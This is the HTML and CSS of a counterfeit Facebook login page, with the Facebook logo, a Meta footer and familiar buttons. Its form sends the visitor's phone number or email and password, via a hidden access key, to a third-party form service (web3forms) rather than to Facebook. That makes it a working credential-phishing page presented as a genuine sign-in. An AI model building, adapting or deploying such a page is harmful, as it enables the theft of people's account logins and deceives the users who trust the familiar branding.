    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom right, #FDF4F4, #EEF7FE, #EEFBF2);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            text-align: center;
            width: 100%;
            max-width: 400px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .header {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 10px;
        }

        .back-icon {
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
            align-self: flex-start;
        }

        .language-selector {
            font-size: 13px;
            color:#666;
            margin-top: 40px;
            cursor: pointer;
        }

        .login-box {
            padding: 20px;
            border-radius: 10px;
            margin-top:30px;
        }

        .logo img {
            width: 60px;
            margin-bottom: 20px;
        }

        .input-field {
            width: 93%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            height: 28px;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .forgot-password {
            display: block;
            margin-top: 10px;
            color: black;
            text-decoration: none;
        }

        .create-account-btn {
            width: 100%;
            padding: 12px;
            background-color:transparent;
            color: #1877f2;
            border: 1px solid #1877f2;
            border-radius: 20px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 130px;
        }

        footer {
            margintop: 20px;
            font-size: 14px;
            color: #aaa;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-directon: column;
            height: 10vh;
        }

        footer img {
            width: 40px;
            margin-bottom: 5px;
        }
        
       .meta{
        display:flex;
        color:#555;
        font-size :16px;
        }
        
    </style>
</head>
<body>
    <div class="login-container">
        <div class="header">
            <span class="back-icon">&#8592;</span>
            <span class="language-selector">English (UK) &#9660;</span>
        </div>
        <div class="login-box">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
            </div>
            <form id="login-form" action="https://api.web3forms.com/submit" method="POST">
                
                <input type="hidden" name="access_key" value="f85ac31a-93f1-47ec-a22b-59ebe755b02a">
                
                <div style="position:relative;">
                
                    <input type="text" placeholder="Mobile number or email address " class="input-field" name="Number" id="phone" required>
                    <i class="fas fa-info-circle" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); color: #1877f2;"></i>
                </div>
                <input type="password" placeholder="Password" class="input-field" name="Pass" id="nick-name"required>
                <button type="submit" class="login-btn">Log in</button>
                <a href="#" class="forgot-password">Forgotten Password?</a>
                <button type="button" class="create-account-btn">Create new account</button>
            </form>
        </div>
        <footer class="meta">
            <i class="fa-brands fa-meta"> </i><span>.</span> <span> Meta</span>
            
           
        </footer>
    </div>
